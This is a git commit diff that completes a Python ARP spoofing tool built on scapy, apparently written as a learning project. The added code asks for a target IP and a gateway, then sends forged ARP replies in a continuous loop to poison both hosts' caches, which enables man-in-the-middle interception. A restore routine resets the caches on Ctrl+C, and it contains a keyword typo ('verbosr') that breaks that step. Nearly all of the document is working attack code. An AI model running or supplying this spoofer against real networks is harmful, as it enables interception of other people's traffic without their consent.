b87a51bc97f6bae68a0b0d7e9431b0175d4dddd1
4ghora <godguymicky@gmail.com>
2023-11-01 19:35:59 +0530

    ✅Spoofer Completed

--- ARP Spoofer/Spoofer.py
+++ ARP Spoofer/Spoofer.py
@@ -1,14 +1,15 @@
 #!/usr/bin/env python3
 import scapy.all as scapy
+import time
 
-## function to spoof, tip means target ip ans sip means spoof if
+## function to spoof, tip means target ip and sip means spoof ip
 def spoof(tip, sip):
     ## tmac is target mac
     tmac = gm(tip)
 ## creating a packet, op is 2 to send a response not a request, pdst is target ip, hwdst is target mac, psrc is gateway ip.
     packet = scapy.ARP(op=2, pdst=tip, hwdst=tmac, psrc=sip)
 ## below code will send the packet, In brackets you have to specify the packet name created.
-    scapy.send(packet)
+    scapy.send(packet, verbose= False)
 
 ## Fuction To Get Mac Address
 def gm(ip): 
@@ -19,13 +20,50 @@ def gm(ip):
     ## Combining broadcast and arp request together
     arb = broadcast/ar 
     ## srp is used to send packets, ans = location where answered packets are stored, unans = location where unanswered packets are stored.
-    ans = scapy.srp(arb, timeout=5, verbose=False)[0]
+    ans = scapy.srp(arb, timeout=2, verbose=False)[0]
     ## 
     return ans[0][1].hwsrc
 
-## Below Code Will Show Packet Contents
-#print(packet.show())
+## dip means destination ip (Router ip), sip here means source ip
+def restore(dip, sip):
+    dip_mac = gm(dip)
+    ## sm = source mac, gm is get mac function, sip is source ip
+    sm = gm(sip)
+    ## op = 2 means its a response not a resquest, pdst= destination ip, hwdst= hardware address mc, psrc= source ip, and hwsrc is hardware source
+    packet = scapy.ARP(op=2, pdst=dip, hwdst=dip_mac, psrc=sip, hwsrc=sm)
+    scapy.send(packet, count=4, verbosr=False)
+    
+
+    ## Below Code Will Show Packet Contents
+    #print(packet.show())
 
 ## Below Code Will Show Summary
 #print(packet.summary())
-gm("172.25.192.1")
+
+
+## tarip means target ip, and gateway is self explainitory
+tarip = input("Enter Target Ip: ")
+gateway = input("Enter Gateway: ")
+
+sent_packets_count = 0
+try:
+    while True:
+        spoof(tarip, gateway)
+        spoof(gateway, tarip)
+        sent_packets_count = sent_packets_count + 2
+        print("\r[+] Packets Sent: " + str(sent_packets_count), end="")
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\nDetected CTRL + C .... Resetting.")
+    print('Sending Reset Packets')
+    restore(tarip, gateway)
+    restore(gateway, tarip)
+
+except IndexError:
+    print('\nIp Address Or Gateway Not Found')
+
+except OSError:
+    print('\nIp Address Or Gateway Not Found')
+
+except TypeError:
+    print('\nIp Address Or Gateway Not Found')
